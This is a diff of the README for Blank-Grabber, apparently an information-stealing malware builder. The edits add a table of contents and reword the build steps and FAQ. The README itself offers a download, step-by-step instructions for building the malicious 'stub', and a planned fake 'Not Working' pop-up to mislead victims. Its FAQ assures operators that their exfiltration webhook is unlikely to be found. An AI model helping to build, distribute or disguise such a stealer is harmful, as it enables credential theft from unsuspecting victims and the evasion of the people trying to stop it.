@@ -18,6 +18,15 @@
    <img src="https://img.shields.io/github/issues-closed/Blank-c/Blank-Grabber">
 </p>
 
+## Table of Contents
+- [Download](#download)
+- [Features](#features)
+- [Builder Config](#builder-config)
+- [Requirements](#requirements)
+- [How to Build?](#how-to-build)
+- [To-Do/Enhancements](#to-doenhancements)
+- [Frequently Asked Questions](#frequently-asked-questions)
+
 ## Download
 [![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/Blank-c/Blank-Grabber/archive/refs/heads/main.zip)
 
@@ -67,7 +76,7 @@
 ## How to Build?
 *If you literally have no idea how to build it.*
 
-1. Download and install [Python 3](https://www.python.org/downloads/#event). (Make sure to enable the "Add to PATH" option)
+1. Download and install [Python 3](https://www.python.org/downloads/#event). (Make sure to enable the *Add to PATH* option.)
 2. Verify the installation by executing `python --version` in [CMD](https://www.howtogeek.com/235101/10-ways-to-open-the-command-prompt-in-windows-10/?).
 3. [Download Blank Grabber](#download).
 4. [Extract](https://www.pcworld.com/article/394871/how-to-unzip-files-in-windows-10.html#:~:text=Unzip%20all%20files%20in%20a%20ZIP%20file) the zip file.
@@ -80,19 +89,18 @@
 - [ ] Fake "Not Working" pop up.
 
 ## Frequently Asked Questions
-- [What is the approximate stub size after compiling?](#what-is-the-approximate-stub-size-after-compiling)
-- [How can I change the icon?](#how-can-i-change-the-icon)
+- [What is the approximate stub size after building?](#what-is-the-approximate-stub-size-after-building)
 - [Can my webhook get leaked?](#can-my-webhook-get-leaked)
 - [How can I contact you?](#how-can-i-contact-you)
 
-### What is the approximate stub size after compiling?
+#### What is the approximate stub size after building?
 
 The approximate size of the stub should be around 7.80 MB.
 
-### Can my webhook get leaked?
+#### Can my webhook get leaked?
 
 There is a very low chance that your webhook is going to be found.
 
-### How can I contact you?
+#### How can I contact you?
 
 You can contact me via [Discord](https://discordlookup.com/user/904682505104396329).
